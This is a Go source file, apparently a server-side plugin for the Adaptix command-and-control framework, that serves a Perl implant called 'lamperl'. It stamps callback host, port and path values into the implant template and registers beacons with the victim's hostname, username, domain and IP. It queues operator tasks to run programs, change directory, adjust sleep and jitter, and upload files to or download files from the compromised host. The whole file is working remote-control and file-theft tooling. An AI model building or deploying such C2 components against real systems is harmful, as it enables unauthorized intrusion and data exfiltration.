package main

import (
	"encoding/base64"
	"encoding/json"
	"errors"
	"fmt"
	"net"
	"os"
	"strings"

	adaptix "github.com/Adaptix-Framework/axc2"
)

// GenerateConfig holds configuration data for agent generation.
// Currently empty as agent_id is generated at runtime by the agent itself,
// not during the build process. This ensures each agent instance has a unique ID.
type GenerateConfig struct {
}

// getString is a helper function to safely extract string values from a map.
// Returns empty string if key doesn't exist or value is not a string.
func getString(m map[string]interface{}, key string) string {
	if val, ok := m[key].(string); ok {
		return val
	}
	return ""
}

// getInt is a helper function to safely extract integer values from a map.
// Handles both float64 (JSON default for numbers) and int types.
// Returns 0 if key doesn't exist or value cannot be converted.
func getInt(m map[string]interface{}, key string) int {
	if val, ok := m[key].(float64); ok {
		return int(val)
	}
	if val, ok := m[key].(int); ok {
		return val
	}
	return 0
}

// AgentGenerateProfile extracts listener configuration needed for agent generation.
// This function is called during agent build to gather connection parameters.
// Parameters:
//   - agentConfig: JSON string with agent-specific configuration (currently unused)
//   - listenerWM: Listener watermark (currently unused)
//   - listenerMap: Map containing listener configuration (callback_address, api_path, etc.)
//
// Returns: JSON-encoded profile data containing callback_addr and api_path
func AgentGenerateProfile(agentConfig string, listenerWM string, listenerMap map[string]any) ([]byte, error) {
	var (
		generateConfig GenerateConfig
		err            error
	)

	err = json.Unmarshal([]byte(agentConfig), &generateConfig)
	if err != nil {
		return nil, err
	}

	/// START CODE HERE

	// Extract callback address and API path from listener
	callbackAddr, ok := listenerMap["callback_address"].(string)
	if !ok {
		return nil, errors.New("callback_address not found in listener map")
	}

	apiPath, ok := listenerMap["api_path"].(string)
	if !ok {
		return nil, errors.New("api_path not found in listener map")
	}

	// Agent generates its own ID at runtime - no need to include in profile
	profileData := map[string]string{
		"callback_addr": callbackAddr,
		"api_path":      apiPath,
	}

	profileBytes, err := json.Marshal(profileData)
	if err != nil {
		return nil, err
	}

	/// END CODE HERE

	return profileBytes, nil
}

// AgentGenerateBuild creates a deployable agent by replacing placeholders in the template.
// This function reads the Perl agent template and injects configuration values.
// Parameters:
//   - agentConfig: JSON string with agent-specific configuration
//   - agentProfile: JSON-encoded profile data from AgentGenerateProfile
//   - listenerMap: Map containing listener configuration
//
// Returns:
//   - Agent file content (Perl script with placeholders replaced)
//   - Filename for the generated agent
//   - Error if any step fails
func AgentGenerateBuild(agentConfig string, agentProfile []byte, listenerMap map[string]any) ([]byte, string, error) {
	var (
		Filename     string
		buildContent []byte
	)

	/// START CODE HERE

	// Parse profile
	var profile map[string]string
	err := json.Unmarshal(agentProfile, &profile)
	if err != nil {
		return nil, "", err
	}

	callbackAddr := profile["callback_addr"]
	apiPath := profile["api_path"]

	// Parse callback address
	host, port, err := net.SplitHostPort(strings.TrimPrefix(strings.TrimPrefix(callbackAddr, "http://"), "https://"))
	if err != nil {
		return nil, "", fmt.Errorf("invalid callback address: %v", err)
	}

	// Read agent template
	currentDir := ModuleDir
	Filename = "lamperl.pl"

	agentContentBytes, err := os.ReadFile(currentDir + "/src_lamperl/lamperl.pl")
	if err != nil {
		return nil, "", err
	}

	agentContent := string(agentContentBytes)

	// Replace placeholders (agent generates its own ID at runtime)
	agentContent = strings.ReplaceAll(agentContent, "<CALLBACK_HOST>", host)
	agentContent = strings.ReplaceAll(agentContent, "<CALLBACK_PORT>", port)
	agentContent = strings.ReplaceAll(agentContent, "<CALLBACK_PATH>", apiPath)
	agentContent = strings.ReplaceAll(agentContent, "<WATERMARK>", AgentWatermark)

	buildContent = []byte(agentContent)

	/// END CODE HERE

	return buildContent, Filename, nil
}

// CreateAgent parses initial beacon data and populates agent metadata.
// Called when an agent checks in for the first time to register it in the C2.
// Parameters:
//   - initialData: JSON-encoded system information from the agent's first beacon
//
// Returns: Populated AgentData struct with system info, sleep/jitter settings, etc.
func CreateAgent(initialData []byte) (adaptix.AgentData, error) {
	var agentData adaptix.AgentData

	/// START CODE HERE

	var initData map[string]interface{}
	err := json.Unmarshal(initialData, &initData)
	if err != nil {
		return agentData, err
	}

	// Extract agent information
	agentData.Computer = getString(initData, "hostname")
	agentData.Username = getString(initData, "username")
	agentData.Domain = getString(initData, "domain")
	agentData.InternalIP = getString(initData, "internal_ip")
	agentData.Process = getString(initData, "process")
	agentData.Pid = fmt.Sprintf("%d", getInt(initData, "pid"))
	agentData.Sleep = uint(getInt(initData, "sleep"))
	agentData.Jitter = uint(getInt(initData, "jitter"))
	agentData.Os = OS_LINUX

	// No encryption for now
	agentData.SessionKey = []byte("NULL")

	/// END CODE

	return agentData, nil
}

// AgentEncryptData encrypts outgoing data sent to the agent.
// Currently unimplemented - returns data as-is without encryption.
// To add encryption: implement RC4, AES, or custom algorithm here.
func AgentEncryptData(data []byte, key []byte) ([]byte, error) {
	/// START CODE
	return data, nil
	/// END CODE
}

// AgentDecryptData decrypts incoming data received from the agent.
// Currently unimplemented - returns data as-is without decryption.
// Must match encryption algorithm implemented in AgentEncryptData.
func AgentDecryptData(data []byte, key []byte) ([]byte, error) {
	/// START CODE
	return data, nil
	/// END CODE
}

/// TASKS

// PackTasks converts Adaptix TaskData array into agent-consumable JSON format.
// Called when the agent checks in to send pending tasks for execution.
// Parameters:
//   - agentData: Agent metadata (unused but required by interface)
//   - tasksArray: Array of tasks to send to the agent
//
// Returns: JSON-encoded response with tasks array, each containing task_id and command data
func PackTasks(agentData adaptix.AgentData, tasksArray []adaptix.TaskData) ([]byte, error) {
	var packData []byte

	/// START CODE HERE

	var tasks []map[string]interface{}

	for _, task := range tasksArray {
		var taskMap map[string]interface{}
		err := json.Unmarshal(task.Data, &taskMap)
		if err != nil {
			continue
		}

		taskMap["task_id"] = task.TaskId
		tasks = append(tasks, taskMap)
	}

	response := map[string]interface{}{
		"tasks": tasks,
	}

	packData, err := json.Marshal(response)
	if err != nil {
		return nil, err
	}

	/// END CODE

	return packData, nil
}

// PackPivotTasks formats tasks for pivoted/proxied agents.
// Currently unimplemented - pivot functionality not supported.
func PackPivotTasks(pivotId string, data []byte) ([]byte, error) {
	/// START CODE HERE
	return data, nil
	/// END CODE HERE
}

// CreateTask converts user input from the UI into a task for the agent.
// Called when an operator executes a command in the Adaptix console.
// Parameters:
//   - ts: Teamserver interface for C2 operations
//   - agent: Agent metadata
//   - args: Map containing command name and parameters from UI
//
// Returns:
//   - TaskData: Serialized task to send to agent
//   - ConsoleMessageData: Message to display in operator's console
//   - Error if command is invalid or parameters are missing
func CreateTask(ts Teamserver, agent adaptix.AgentData, args map[string]any) (adaptix.TaskData, adaptix.ConsoleMessageData, error) {
	var (
		taskData    adaptix.TaskData
		messageData adaptix.ConsoleMessageData
		err         error
	)

	//command, ok := args["command"].(string)
	//if !ok {
	//	return taskData, messageData, errors.New("'command' must be set")
	//}
	//subcommand, _ := args["subcommand"].(string)

	taskData = adaptix.TaskData{
		Type: TYPE_TASK,
		Sync: true,
	}

	messageData = adaptix.ConsoleMessageData{
		Status: MESSAGE_INFO,
		Text:   "",
	}
	messageData.Message, _ = args["message"].(string)

	/// START CODE HERE

	command, ok := args["command"].(string)
	if !ok {
		return taskData, messageData, errors.New("'command' must be set")
	}

	subcommand, _ := args["subcommand"].(string)

	commandData := make(map[string]interface{})
	commandData["command"] = command

	switch command {
	case "pwd":
		// No additional parameters needed
	case "cd":
		path, ok := args["path"].(string)
		if !ok {
			err = errors.New("parameter 'path' must be set")
			return taskData, messageData, err
		}
		commandData["path"] = path
	case "sleep":
		duration, ok := args["duration"].(float64)
		if !ok {
			err = errors.New("parameter 'duration' must be set")
			return taskData, messageData, err
		}
		commandData["duration"] = int(duration)
		if jitter, ok := args["jitter"].(float64); ok {
			commandData["jitter"] = int(jitter)
		}
	case "terminate":
		// No additional parameters needed
	case "run":
		taskData.Type = TYPE_JOB

		executable, ok := args["executable"].(string)
		if !ok {
			err = errors.New("parameter 'executable' must be set")
			return taskData, messageData, err
		}
		commandData["executable"] = executable
		if cmdArgs, ok := args["args"].(string); ok {
			commandData["args"] = cmdArgs
		}
		commandData["async"] = true
	case "download":
		taskData.Type = TYPE_JOB

		path, ok := args["file"].(string)
		if !ok {
			err = errors.New("parameter 'file' must be set")
			return taskData, messageData, err
		}
		commandData["path"] = path
	case "upload":
		taskData.Type = TYPE_JOB

		remotePath, ok := args["remote_path"].(string)
		if !ok {
			err = errors.New("parameter 'remote_path' must be set")
			return taskData, messageData, err
		}

		// Get file content from file_id
		var fileContent []byte
		if fileId, ok := args["file_id"].(string); ok && fileId != "" {
			fileContent, err = ts.TsUploadGetFileContent(fileId)
			if err != nil {
				return taskData, messageData, err
			}
		} else if localFile, ok := args["local_file"].(string); ok && localFile != "" {
			// Fallback to base64 encoded content
			fileContent, err = base64.StdEncoding.DecodeString(localFile)
			if err != nil {
				return taskData, messageData, err
			}
		} else {
			err = errors.New("parameter 'file_id' or 'local_file' must be set")
			return taskData, messageData, err
		}

		// Base64 encode for JSON transport
		base64Content := base64.StdEncoding.EncodeToString(fileContent)
		commandData["path"] = remotePath
		commandData["content"] = base64Content
	case "jobs":
		// Handle subcommands
		switch subcommand {
		case "list":
			commandData["command"] = "job_list"
		case "kill":
			commandData["command"] = "job_kill"
			jobId, ok := args["job_id"].(string)
			if !ok {
				err = errors.New("parameter 'job_id' must be set")
				return taskData, messageData, err
			}
			commandData["job_id"] = jobId
		case "get":
			commandData["command"] = "job_get"
			jobId, ok := args["job_id"].(string)
			if !ok {
				err = errors.New("parameter 'job_id' must be set")
				return taskData, messageData, err
			}
			commandData["job_id"] = jobId
			if tail, ok := args["tail"].(float64); ok && tail > 0 {
				commandData["tail"] = int(tail)
			}
		default:
			err = fmt.Errorf("unknown jobs subcommand: %s", subcommand)
			return taskData, messageData, err
		}
	default:
		err = fmt.Errorf("unknown command: %s", command)
		return taskData, messageData, err
	}

	taskData.Data, err = json.Marshal(commandData)
	if err != nil {
		return taskData, messageData, err
	}

	/// END CODE

	return taskData, messageData, err
}

// ProcessTasksResult parses agent task responses and displays formatted output.
// Called when agent sends back task execution results.
// Parameters:
//   - ts: Teamserver interface for console output
//   - agentData: Agent metadata
//   - taskData: Original task data (unused but required by interface)
//   - packedData: JSON-encoded array of task results from agent
//
// Returns: Array of additional tasks to queue (currently always empty)
func ProcessTasksResult(ts Teamserver, agentData adaptix.AgentData, taskData adaptix.TaskData, packedData []byte) []adaptix.TaskData {
	var outTasks []adaptix.TaskData

	/// START CODE

	// Parse results array
	var results []map[string]interface{}
	err := json.Unmarshal(packedData, &results)
	if err != nil {
		return outTasks
	}

	// Process each result
	for _, result := range results {
		taskId := getString(result, "task_id")
		output := getString(result, "output")

		// Parse the output JSON to format it nicely
		var outputData map[string]interface{}
		err := json.Unmarshal([]byte(output), &outputData)
		if err != nil {
			// If parsing fails, just show raw output
			continue
		}

		command := getString(outputData, "command")

		// Create task object to track completion status
		// Default to TYPE_TASK, will override for jobs
		task := adaptix.TaskData{
			Type:        TYPE_TASK,
			TaskId:      taskId,
			AgentId:     agentData.Id,
			Completed:   true,
			MessageType: MESSAGE_SUCCESS,
		}

		switch command {
		case "pwd":
			path := getString(outputData, "path")
			task.Message = "Current directory:"
			task.ClearText = path
		case "cd":
			if errMsg := getString(outputData, "error"); errMsg != "" {
				task.Message = fmt.Sprintf("Error: %s", errMsg)
				task.MessageType = MESSAGE_ERROR
			} else {
				path := getString(outputData, "path")
				task.Message = "Changed directory to:"
				task.ClearText = path
			}
		case "sleep":
			duration := getInt(outputData, "duration")
			jitter := getInt(outputData, "jitter")

			// Update agent data with new sleep configuration
			agentData.Sleep = uint(duration)
			agentData.Jitter = uint(jitter)
			_ = ts.TsAgentUpdateData(agentData)

			task.Message = fmt.Sprintf("Sleep scheduled for %d seconds with %d%% jitter", duration, jitter)
		case "terminate":
			task.Message = "Terminating beacon"
		case "run":
			task.Type = TYPE_JOB

			// Check if this is async job start or completed job
			if async, _ := outputData["async"].(bool); async {
				// Job starting - mark as not completed
				jobId := getString(outputData, "job_id")
				pid := getInt(outputData, "pid")
				executable := getString(outputData, "executable")
				args := getString(outputData, "args")

				cmdStr := executable
				if args != "" {
					cmdStr = fmt.Sprintf("%s %s", executable, args)
				}

				task.Completed = false
				task.Message = fmt.Sprintf("Running command: %s", cmdStr)
				task.ClearText = fmt.Sprintf("Job %s (PID: %d) started in background", jobId, pid)
			} else {
				// Job completed - this comes from automatic job reporting
				executable := getString(outputData, "executable")
				args := getString(outputData, "args")
				outputStr := getString(outputData, "output")
				exitCode := getInt(outputData, "exit_code")

				cmdStr := executable
				if args != "" {
					cmdStr = fmt.Sprintf("%s %s", executable, args)
				}

				if exitCode == 0 {
					task.Message = fmt.Sprintf("Command completed successfully: %s", cmdStr)
					task.MessageType = MESSAGE_SUCCESS
				} else {
					task.Message = fmt.Sprintf("Command failed with exit code %d: %s", exitCode, cmdStr)
					task.MessageType = MESSAGE_ERROR
				}
				task.ClearText = outputStr
			}
		case "job_list":
			if errMsg := getString(outputData, "error"); errMsg != "" {
				task.Message = fmt.Sprintf("Error: %s", errMsg)
				task.MessageType = MESSAGE_ERROR
			} else {
				jobsData, ok := outputData["jobs"].([]interface{})
				if !ok || len(jobsData) == 0 {
					task.Message = "No background jobs"
				} else {
					task.Message = "Background Jobs"
					var jobsOutput string
					jobsOutput = "Background Jobs:\n"
					jobsOutput += fmt.Sprintf("%-10s %-8s %-12s %s\n", "Job ID", "PID", "Status", "Command")
					jobsOutput += strings.Repeat("-", 80) + "\n"
					for _, jobInterface := range jobsData {
						job, ok := jobInterface.(map[string]interface{})
						if !ok {
							continue
						}
						jobId := getString(job, "job_id")
						pid := getInt(job, "pid")
						status := getString(job, "status")
						executable := getString(job, "executable")
						args := getString(job, "args")

						// Combine executable and args into command
						cmdStr := executable
						if args != "" {
							cmdStr = fmt.Sprintf("%s %s", executable, args)
						}

						jobsOutput += fmt.Sprintf("%-10s %-8d %-12s %s\n", jobId, pid, status, cmdStr)
					}
					task.ClearText = jobsOutput
				}
			}
		case "job_kill":
			if errMsg := getString(outputData, "error"); errMsg != "" {
				task.Message = fmt.Sprintf("Error: %s", errMsg)
				task.MessageType = MESSAGE_ERROR
			} else {
				jobId := getString(outputData, "job_id")
				pid := getInt(outputData, "pid")
				task.Message = fmt.Sprintf("Killed job %s (PID: %d)", jobId, pid)

				// Also update the original task that started this job
				originalTask := adaptix.TaskData{
					Type:        TYPE_TASK,
					TaskId:      jobId,
					AgentId:     agentData.Id,
					Completed:   true,
					MessageType: MESSAGE_SUCCESS,
					Message:     fmt.Sprintf("Job killed (PID: %d)", pid),
				}
				outTasks = append(outTasks, originalTask)
			}
		case "job_get":
			if errMsg := getString(outputData, "error"); errMsg != "" {
				task.Message = fmt.Sprintf("Error: %s", errMsg)
				task.MessageType = MESSAGE_ERROR
			} else {
				outputStr := getString(outputData, "output")
				executable := getString(outputData, "executable")
				args := getString(outputData, "args")
				jobId := getString(outputData, "job_id")
				status := getString(outputData, "status")

				// Build command string for header
				cmdStr := executable
				if args != "" {
					cmdStr = fmt.Sprintf("%s %s", executable, args)
				}

				if outputStr != "" {
					task.Message = fmt.Sprintf("Job %s output: %s", jobId, cmdStr)
					task.ClearText = outputStr
				} else {
					task.Message = fmt.Sprintf("Job %s - Status: %s (no output yet)", jobId, status)
				}
			}
		case "download":
			task.Type = TYPE_JOB

			asyncVal := getInt(outputData, "async")
			if asyncVal != 0 {
				jobId := getString(outputData, "job_id")
				pid := getInt(outputData, "pid")
				path := getString(outputData, "path")
				task.Completed = false
				task.Message = fmt.Sprintf("Downloading: %s", path)
				task.ClearText = fmt.Sprintf("Job %s (PID: %d) started in background", jobId, pid)
			} else if errMsg := getString(outputData, "error"); errMsg != "" {
				task.Message = fmt.Sprintf("Download error: %s", errMsg)
				task.MessageType = MESSAGE_ERROR
			} else {
				// This is completed download output from job
				path := getString(outputData, "path")
				fileId := getString(outputData, "file_id")
				sizeFloat, _ := outputData["size"].(float64)
				size := int(sizeFloat)
				contentB64 := getString(outputData, "content")

				if contentB64 == "" || size == 0 {
					task.Message = fmt.Sprintf("Download failed: %s (file not found or empty)", path)
					task.MessageType = MESSAGE_ERROR
				} else {
					// Decode base64 content
					fileContent, err := base64.StdEncoding.DecodeString(contentB64)
					if err != nil {
						task.Message = fmt.Sprintf("Error decoding downloaded file %s: %s", path, err.Error())
						task.MessageType = MESSAGE_ERROR
					} else {
						// Extract filename from path
						fileName := path
						if idx := strings.LastIndex(path, "/"); idx != -1 {
							fileName = path[idx+1:]
						}

						// Save file using C2 bindings
						err := ts.TsDownloadSave(agentData.Id, fileId, fileName, fileContent)
						if err != nil {
							task.Message = fmt.Sprintf("Error saving downloaded file %s: %s", path, err.Error())
							task.MessageType = MESSAGE_ERROR
						} else {
							task.Message = fmt.Sprintf("Download completed: %s", fileName)
							task.MessageType = MESSAGE_SUCCESS
							task.ClearText = fmt.Sprintf("Size: %d bytes\nFile ID: %s", size, fileId)
						}
					}
				}
			}
		case "upload":
			task.Type = TYPE_JOB

			asyncVal := getInt(outputData, "async")
			if asyncVal != 0 {
				jobId := getString(outputData, "job_id")
				pid := getInt(outputData, "pid")
				path := getString(outputData, "path")
				task.Completed = false
				task.Message = fmt.Sprintf("Uploading to: %s", path)
				task.ClearText = fmt.Sprintf("Job %s (PID: %d) started in background", jobId, pid)
			} else if errMsg := getString(outputData, "error"); errMsg != "" {
				task.Message = fmt.Sprintf("Upload error: %s", errMsg)
				task.MessageType = MESSAGE_ERROR
			} else {
				// This is completed upload output from job
				path := getString(outputData, "path")
				outputStr := getString(outputData, "output")
				success := outputStr == "success"

				if success {
					task.Message = fmt.Sprintf("Upload completed: %s", path)
					task.MessageType = MESSAGE_SUCCESS
				} else {
					errorMsg := outputStr
					if errorMsg == "" {
						errorMsg = "Unknown error"
					}
					task.Message = fmt.Sprintf("Failed to upload to %s: %s", path, errorMsg)
					task.MessageType = MESSAGE_ERROR
				}
			}
		default:
			if errMsg := getString(outputData, "error"); errMsg != "" {
				task.Message = fmt.Sprintf("Error: %s", errMsg)
				task.MessageType = MESSAGE_ERROR
			} else {
				// Show raw JSON output for unknown commands
				jsonBytes, _ := json.MarshalIndent(outputData, "", "  ")
				task.Message = fmt.Sprintf("Command result: %s", command)
				task.ClearText = string(jsonBytes)
			}
		}

		// Add task to output array for status tracking
		outTasks = append(outTasks, task)
	}

	/// END CODE

	return outTasks
}

/// TUNNELS

func TunnelCreateTCP(channelId int, address string, port int) ([]byte, error) {
	/// START CODE HERE
	return nil, errors.New("Function Tunnel not supported")
	/// END CODE HERE
}

func TunnelCreateUDP(channelId int, address string, port int) ([]byte, error) {
	/// START CODE HERE
	return nil, errors.New("Function Tunnel not supported")
	/// END CODE HERE
}

func TunnelWriteTCP(channelId int, data []byte) ([]byte, error) {
	/// START CODE HERE
	return nil, errors.New("Function Tunnel not supported")
	/// END CODE HERE
}

func TunnelWriteUDP(channelId int, data []byte) ([]byte, error) {
	/// START CODE HERE
	return nil, errors.New("Function Tunnel not supported")
	/// END CODE HERE
}

func TunnelClose(channelId int) ([]byte, error) {
	/// START CODE HERE
	return nil, errors.New("Function Tunnel not supported")
	/// END CODE HERE
}

func TunnelReverse(tunnelId int, port int) ([]byte, error) {
	/// START CODE HERE
	return nil, errors.New("Function Tunnel not supported")
	/// END CODE HERE
}

/// TERMINAL

func TerminalStart(terminalId int, program string, sizeH int, sizeW int) ([]byte, error) {
	/// START CODE HERE
	return nil, errors.New("Function Remote Terminal not supported")
	/// END CODE HERE
}

func TerminalWrite(terminalId int, data []byte) ([]byte, error) {
	/// START CODE HERE
	return nil, errors.New("Function Remote Terminal not supported")
	/// END CODE HERE
}

func TerminalClose(terminalId int) ([]byte, error) {
	/// START CODE HERE
	return nil, errors.New("Function Remote Terminal not supported")
	/// END CODE HERE
}
